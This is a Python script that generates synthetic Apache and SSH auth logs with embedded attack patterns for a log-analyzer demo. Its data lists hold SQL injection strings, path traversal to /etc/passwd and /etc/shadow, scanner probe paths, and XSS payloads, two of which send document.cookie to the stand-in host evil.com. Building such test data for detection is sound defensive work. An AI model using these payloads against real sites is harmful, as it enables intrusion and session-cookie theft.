"""
Generate realistic sample log files for Log Analyzer demo.
This creates ~1000-line Apache and ~500-line SSH logs with embedded attack patterns.
"""
import random
from datetime import datetime, timedelta

def generate_apache_log():
    """Generate a realistic sample Apache combined log file."""
    lines = []
    base_time = datetime(2024, 1, 15, 8, 0, 0)
    
    # Normal traffic IPs and their user agents
    normal_ips = [
        ("192.168.1.5", "frank", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
        ("192.168.1.10", "alice", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
        ("10.0.0.10", "-", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"),
        ("172.16.0.50", "-", "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"),
        ("192.168.1.100", "-", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"),
        ("10.20.30.40", "-", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"),
        ("192.168.2.200", "-", "axios/1.4.0"),
        ("172.16.1.25", "-", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"),
        ("10.0.1.15", "-", "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15"),
        ("192.168.3.75", "bob", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"),
    ]
    
    normal_paths = [
        ("/", 200), ("/index.html", 200), ("/about.html", 200), ("/contact", 200),
        ("/products", 200), ("/shop", 200), ("/blog", 200), ("/blog/post/1", 200),
        ("/blog/post/2", 200), ("/blog/post/3", 200), ("/news", 200), ("/faq", 200),
        ("/dashboard", 200), ("/profile", 200), ("/settings", 200),
        ("/api/data", 200), ("/api/v1/users", 200), ("/api/v1/orders", 200),
        ("/shop/item/1", 200), ("/shop/item/2", 200), ("/shop/item/3", 200),
        ("/shop/cart", 200), ("/shop/checkout", 200),
        ("/images/logo.png", 200), ("/css/style.css", 200), ("/js/app.js", 200),
        ("/home", 200), ("/home/profile", 200), ("/search", 200),
        ("/api/health", 200), ("/sitemap.xml", 200), ("/robots.txt", 200),
    ]
    
    methods = ["GET", "GET", "GET", "GET", "POST", "GET", "GET"]
    
    def fmt_time(dt):
        return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")
    
    def make_line(ip, user, ts, method, path, status, size, referer, ua):
        return f'{ip} - {user} [{fmt_time(ts)}] "{method} {path} HTTP/1.1" {status} {size} "{referer}" "{ua}"'
    
    t = base_time
    
    # ── Phase 1: Normal morning traffic (lines 1-100) ──
    for i in range(100):
        ip, user, ua = random.choice(normal_ips)
        path, status = random.choice(normal_paths)
        method = random.choice(methods)
        size = random.randint(256, 16384)
        t += timedelta(seconds=random.randint(1, 15))
        lines.append(make_line(ip, user, t, method, path, status, size, "-", ua))
    
    # ── Phase 2: HTTP Brute Force Attack (IP: 185.234.219.75) ──
    # 40+ rapid 401 responses in ~60 seconds
    brute_ip = "185.234.219.75"
    brute_ua = "python-requests/2.28.0"
    t = base_time + timedelta(hours=2, minutes=2)
    for i in range(45):
        t += timedelta(seconds=random.uniform(0.5, 1.5))
        lines.append(make_line(brute_ip, "-", t, "POST", "/login", 401, 234, "-", brute_ua))
    # A few 403s mixed in
    for i in range(10):
        t += timedelta(seconds=random.uniform(0.3, 1.0))
        lines.append(make_line(brute_ip, "-", t, "POST", "/api/auth", 403, 178, "-", brute_ua))
    
    # ── Normal traffic intermission ──
    t = base_time + timedelta(hours=2, minutes=10)
    for i in range(60):
        ip, user, ua = random.choice(normal_ips)
        path, status = random.choice(normal_paths)
        method = random.choice(methods)
        size = random.randint(256, 16384)
        t += timedelta(seconds=random.randint(2, 20))
        lines.append(make_line(ip, user, t, method, path, status, size, "-", ua))
    
    # ── Phase 3: Second brute force IP (77.247.181.162) ──
    brute2_ip = "77.247.181.162"
    brute2_ua = "curl/7.88.1"
    t = base_time + timedelta(hours=2, minutes=30)
    for i in range(35):
        t += timedelta(seconds=random.uniform(0.5, 2.0))
        path = random.choice(["/login", "/admin/login", "/api/token", "/wp-login.php"])
        lines.append(make_line(brute2_ip, "-", t, "POST", path, random.choice([401, 403]), 234, "-", brute2_ua))
    
    # ── Normal traffic ──
    t = base_time + timedelta(hours=3)
    for i in range(80):
        ip, user, ua = random.choice(normal_ips)
        path, status = random.choice(normal_paths)
        method = random.choice(methods)
        size = random.randint(256, 16384)
        t += timedelta(seconds=random.randint(1, 12))
        lines.append(make_line(ip, user, t, method, path, status, size, "-", ua))
    
    # ── Phase 4: Path/Directory Scanning (IP: 45.33.32.156 using Nikto) ──
    scanner_ip = "45.33.32.156"
    scanner_ua = "Nikto/2.1.6"
    scan_paths = [
        "/index.php", "/admin", "/phpmyadmin", "/wp-admin", "/backup", "/.env",
        "/config", "/server-status", "/robots.txt", "/sitemap.xml", "/xmlrpc.php",
        "/api", "/cgi-bin/test.cgi", "/test.php", "/shell.php", "/upload",
        "/images", "/tmp", "/logs", "/cache", "/old", "/new", "/public",
        "/private", "/secret", "/data", "/dev", "/staging", "/beta", "/docs",
        "/api/v1", "/api/v2", "/health", "/status", "/debug", "/trace",
        "/manager", "/console", "/actuator", "/metrics", "/info", "/swagger",
        "/graphql", "/api/admin", "/.git/config", "/.htaccess", "/web.config",
        "/crossdomain.xml", "/clientaccesspolicy.xml", "/phpinfo.php",
        "/test", "/demo", "/sample", "/temp", "/bak", "/sql", "/db",
        "/database", "/dump", "/export", "/download", "/file",
        "/wp-content", "/wp-includes", "/wp-config.php",
    ]
    t = base_time + timedelta(hours=4, minutes=4)
    for path in scan_paths:
        t += timedelta(seconds=random.uniform(0.3, 1.2))
        status = random.choice([200, 403, 404, 404, 404, 403])
        lines.append(make_line(scanner_ip, "-", t, "GET", path, status, random.randint(32, 1024), "-", scanner_ua))
    
    # ── Normal traffic ──
    t = base_time + timedelta(hours=4, minutes=30)
    for i in range(70):
        ip, user, ua = random.choice(normal_ips)
        path, status = random.choice(normal_paths)
        method = random.choice(methods)
        size = random.randint(256, 16384)
        t += timedelta(seconds=random.randint(2, 15))
        lines.append(make_line(ip, user, t, method, path, status, size, "-", ua))
    
    # ── Phase 5: DoS / Flooding Attack (IP: 203.0.113.195) ──
    # 250+ requests in ~10 seconds
    dos_ip = "203.0.113.195"
    dos_ua = "Mozilla/5.0"
    t = base_time + timedelta(hours=6, minutes=6)
    for i in range(260):
        t += timedelta(milliseconds=random.randint(20, 80))
        lines.append(make_line(dos_ip, "-", t, "GET", "/", 200, 512, "-", dos_ua))
    
    # ── Normal traffic ──
    t = base_time + timedelta(hours=6, minutes=30)
    for i in range(60):
        ip, user, ua = random.choice(normal_ips)
        path, status = random.choice(normal_paths)
        method = random.choice(methods)
        size = random.randint(256, 16384)
        t += timedelta(seconds=random.randint(2, 20))
        lines.append(make_line(ip, user, t, method, path, status, size, "-", ua))
    
    # ── Phase 6: SQL Injection Probes (IP: 91.108.4.1 using sqlmap) ──
    sqli_ip = "91.108.4.1"
    sqli_ua = "sqlmap/1.7"
    sqli_paths = [
        "/login?user=admin'%20OR%201=1--",
        "/search?q=SELECT%20*%20FROM%20users",
        "/user?id=1%20UNION%20SELECT%201,2,3--",
        "/page?id=1'%20AND%201=1--",
        "/api/data?sort=name;DROP%20TABLE%20users",
        "/product?id=1%20OR%201=1",
        "/category?name=test'%20UNION%20SELECT%20password%20FROM%20users--",
        "/filter?type=1;INSERT%20INTO%20admin(user,pass)%20VALUES('hack','hack')",
        "/view?file=1'%20OR%20'1'='1",
        "/download?path=xp_cmdshell('dir')",
        "/query?search=admin'--%20",
        "/list?order=name%20UNION%20SELECT%20*%20FROM%20information_schema.tables--",
    ]
    t = base_time + timedelta(hours=7, minutes=7)
    for path in sqli_paths:
        t += timedelta(seconds=random.uniform(0.8, 2.0))
        status = random.choice([200, 500, 200, 500])
        lines.append(make_line(sqli_ip, "-", t, "GET", path, status, random.randint(256, 2048), "-", sqli_ua))
    
    # ── Phase 7: Directory Traversal (same IP: 91.108.4.1) ──
    traversal_paths = [
        "/../../etc/passwd", "/../../../etc/shadow",
        "/....//....//etc/passwd", "/%2e%2e%2f%2e%2e%2fetc/passwd",
        "/..\\..\\windows\\system32\\config\\sam",
        "/static/../../../etc/hosts", "/images/../../config/database.yml",
        "/download?file=../../../etc/passwd",
    ]
    for path in traversal_paths:
        t += timedelta(seconds=random.uniform(0.5, 1.5))
        lines.append(make_line(sqli_ip, "-", t, "GET", path, 403, 287, "-", sqli_ua))
    
    # ── Phase 8: XSS Probes (same IP: 91.108.4.1) ──
    xss_paths = [
        "/page?xss=<script>alert(1)</script>",
        "/search?q=<img%20onerror=alert(1)>",
        "/comment?body=javascript:alert(document.cookie)",
        "/profile?name=<script>document.location='http://evil.com?c='+document.cookie</script>",
        "/form?input=%3Cscript%3Ealert('XSS')%3C/script%3E",
        "/api?callback=<script>fetch('http://evil.com/'+document.cookie)</script>",
    ]
    for path in xss_paths:
        t += timedelta(seconds=random.uniform(0.5, 1.5))
        lines.append(make_line(sqli_ip, "-", t, "GET", path, 200, 512, "-", sqli_ua))
    
    # ── Phase 9: Admin Panel Probing (IP: 117.26.247.55) ──
    admin_ip = "117.26.247.55"
    admin_ua = "gobuster/3.5"
    admin_paths = [
        "/admin", "/admin/login", "/admin/dashboard", "/wp-admin",
        "/wp-login.php", "/phpmyadmin", "/phpmyadmin/index.php",
        "/manager", "/manager/html", "/console", "/actuator",
        "/actuator/env", "/actuator/health", "/api/admin",
        "/api/admin/users", "/.env", "/.env.production",
        "/config", "/config.php", "/backup", "/backup.sql",
        "/shell", "/cmd", "/exec", "/etc/passwd",
    ]
    t = base_time + timedelta(hours=8, minutes=15)
    for path in admin_paths:
        t += timedelta(seconds=random.uniform(0.5, 1.5))
        status = random.choice([403, 404, 403, 404, 404])
        lines.append(make_line(admin_ip, "-", t, "GET", path, status, 287, "-", admin_ua))
    
    # ── Phase 10: Another scanner with masscan UA ──
    mass_ip = "94.102.49.88"
    mass_ua = "masscan/1.3"
    t = base_time + timedelta(hours=9)
    for i in range(15):
        t += timedelta(seconds=random.uniform(0.2, 0.8))
        path = f"/port-{random.randint(80,9999)}"
        lines.append(make_line(mass_ip, "-", t, "GET", path, 404, 287, "-", mass_ua))
    
    # ── Final normal traffic ──
    t = base_time + timedelta(hours=10)
    for i in range(100):
        ip, user, ua = random.choice(normal_ips)
        path, status = random.choice(normal_paths)
        method = random.choice(methods)
        size = random.randint(256, 16384)
        t += timedelta(seconds=random.randint(1, 15))
        lines.append(make_line(ip, user, t, method, path, status, size, "https://example.com", ua))
    
    return "\n".join(lines) + "\n"


def generate_ssh_log():
    """Generate a realistic sample SSH auth.log file (~500 lines)."""
    lines = []
    base_time = datetime(2024, 1, 15, 6, 0, 0)
    pid = 1234
    
    def fmt_time(dt):
        return dt.strftime("%b %d %H:%M:%S")
    
    def next_pid():
        nonlocal pid
        pid += 1
        return pid
    
    t = base_time
    
    # ── Normal SSH activity: accepted logins ──
    normal_events = [
        "Accepted password for ubuntu from 10.0.0.5 port {port} ssh2",
        "Accepted publickey for devops from 192.168.1.50 port {port} ssh2",
        "Accepted password for deploy from 172.16.0.10 port {port} ssh2",
        "Accepted password for ubuntu from 192.168.1.1 port {port} ssh2",
        "Accepted publickey for root from 10.0.0.1 port {port} ssh2",
        "Accepted password for admin from 192.168.5.20 port {port} ssh2",
        "Accepted publickey for jenkins from 10.0.0.100 port {port} ssh2",
        "Accepted publickey for gitlab from 10.0.0.200 port {port} ssh2",
        "Accepted password for webadmin from 192.168.10.5 port {port} ssh2",
        "Accepted publickey for ansible from 10.0.0.50 port {port} ssh2",
    ]
    
    # ── Server startup messages ──
    lines.append(f"{fmt_time(base_time)} server sshd[1000]: Server listening on 0.0.0.0 port 22.")
    lines.append(f"{fmt_time(base_time)} server sshd[1000]: Server listening on :: port 22.")
    lines.append(f"{fmt_time(base_time)} server sshd[1001]: sshd: PEM_read_PrivateKey: PEM routines:get_name:no start line")
    
    # Sprinkle normal logins throughout the day (~40)
    normal_times = sorted([base_time + timedelta(minutes=random.randint(0, 720)) for _ in range(40)])
    for nt in normal_times:
        msg = random.choice(normal_events).format(port=random.randint(40000, 65000))
        lines.append(f"{fmt_time(nt)} server sshd[{next_pid()}]: {msg}")
        # Sometimes add a disconnect after
        if random.random() < 0.3:
            disc_t = nt + timedelta(minutes=random.randint(5, 120))
            disc_ip = msg.split("from ")[1].split(" ")[0]
            lines.append(f"{fmt_time(disc_t)} server sshd[{next_pid()}]: Received disconnect from {disc_ip} port {random.randint(40000,60000)}:11: disconnected by user")

    # ── Common usernames for brute force attacks ──
    all_users = [
        "root", "root", "root", "admin", "admin", "admin",
        "ubuntu", "ubuntu", "pi", "pi", "test", "test",
        "postgres", "mysql", "oracle", "user", "ftp", "guest",
        "www-data", "deploy", "git", "jenkins", "tomcat", "ansible",
        "vagrant", "docker", "redis", "nginx", "apache",
        "backup", "operator", "mail", "daemon", "bin",
        "webmaster", "staff", "centos", "fedora", "debian",
        "kali", "nobody", "proxy", "postfix", "dovecot",
        "sshd", "www", "http", "nagios", "zabbix",
    ]
    invalid_users = {"pi", "test", "hacker", "vagrant", "docker", "nobody",
                     "proxy", "sshd", "postfix", "dovecot", "kali", "http",
                     "nagios", "zabbix", "scanner", "support", "info"}
    
    def add_brute_force(ip, start_time, num_attempts):
        """Generate a brute force attack from an IP."""
        nonlocal t
        t = start_time
        for i in range(num_attempts):
            user = random.choice(all_users)
            t += timedelta(seconds=random.uniform(0.3, 2.0))
            port = random.randint(30000, 65000)
            if user in invalid_users:
                lines.append(f"{fmt_time(t)} server sshd[{next_pid()}]: Invalid user {user} from {ip} port {port}")
                lines.append(f"{fmt_time(t)} server sshd[{next_pid()}]: Failed password for invalid user {user} from {ip} port {port} ssh2")
            else:
                lines.append(f"{fmt_time(t)} server sshd[{next_pid()}]: Failed password for {user} from {ip} port {port} ssh2")
    
    # ── Brute Force Attack 1: IP 185.234.219.75 (major attack - 50 attempts) ──
    add_brute_force("185.234.219.75", base_time + timedelta(hours=1, minutes=1), 50)
    
    # ── Brute Force Attack 2: IP 198.51.100.12 (30 attempts) ──
    add_brute_force("198.51.100.12", base_time + timedelta(hours=1, minutes=45), 30)
    
    # ── Brute Force Attack 3: IP 91.108.4.1 (25 attempts + ROOT REFUSED) ──
    add_brute_force("91.108.4.1", base_time + timedelta(hours=2, minutes=30), 25)
    t2 = base_time + timedelta(hours=2, minutes=32)
    lines.append(f"{fmt_time(t2)} server sshd[{next_pid()}]: ROOT LOGIN REFUSED from 91.108.4.1")
    
    # ── Brute Force Attack 4: IP 203.0.113.50 (20 attempts) ──
    add_brute_force("203.0.113.50", base_time + timedelta(hours=3, minutes=15), 20)
    
    # ── Brute Force Attack 5: IP 77.247.181.162 (35 attempts) ──
    add_brute_force("77.247.181.162", base_time + timedelta(hours=4, minutes=0), 35)
    
    # ── Brute Force Attack 6: IP 117.26.247.55 (25 attempts) ──
    add_brute_force("117.26.247.55", base_time + timedelta(hours=4, minutes=30), 25)
    
    # ── Brute Force Attack 7: IP 94.102.49.88 (20 attempts) ──
    add_brute_force("94.102.49.88", base_time + timedelta(hours=5, minutes=0), 20)
    
    # ── Brute Force Attack 8: IP 45.33.32.156 (15 attempts) ──
    add_brute_force("45.33.32.156", base_time + timedelta(hours=5, minutes=30), 15)
    
    # ── Brute Force Attack 9: IP 185.220.101.42 (40 attempts) ──
    add_brute_force("185.220.101.42", base_time + timedelta(hours=6, minutes=0), 40)
    
    # ── Brute Force Attack 10: IP 171.25.193.78 (30 attempts) ──
    add_brute_force("171.25.193.78", base_time + timedelta(hours=7, minutes=0), 30)
    
    # ── Additional disconnects from normal users ──
    for i in range(15):
        disc_t = base_time + timedelta(minutes=random.randint(60, 700))
        disc_ip = random.choice(["172.16.0.10", "10.0.0.5", "192.168.1.50", 
                                  "192.168.1.1", "10.0.0.1", "192.168.5.20",
                                  "10.0.0.100", "10.0.0.200"])
        lines.append(f"{fmt_time(disc_t)} server sshd[{next_pid()}]: Received disconnect from {disc_ip} port {random.randint(40000, 60000)}:11: disconnected by user")
    
    # ── PAM/system messages for realism ──
    for i in range(10):
        msg_t = base_time + timedelta(minutes=random.randint(0, 700))
        attacker = random.choice(["185.234.219.75", "91.108.4.1", "198.51.100.12", "77.247.181.162"])
        lines.append(f"{fmt_time(msg_t)} server sshd[{next_pid()}]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={attacker}")
    
    return "\n".join(lines) + "\n"


if __name__ == "__main__":
    import os
    
    data_dir = os.path.dirname(os.path.abspath(__file__))
    
    apache_log = generate_apache_log()
    apache_path = os.path.join(data_dir, "sample_apache.log")
    with open(apache_path, "w", encoding="utf-8") as f:
        f.write(apache_log)
    print(f"Generated {apache_path}: {len(apache_log.splitlines())} lines, {len(apache_log)} bytes")
    
    ssh_log = generate_ssh_log()
    ssh_path = os.path.join(data_dir, "sample_ssh.log")
    with open(ssh_path, "w", encoding="utf-8") as f:
        f.write(ssh_log)
    print(f"Generated {ssh_path}: {len(ssh_log.splitlines())} lines, {len(ssh_log)} bytes")
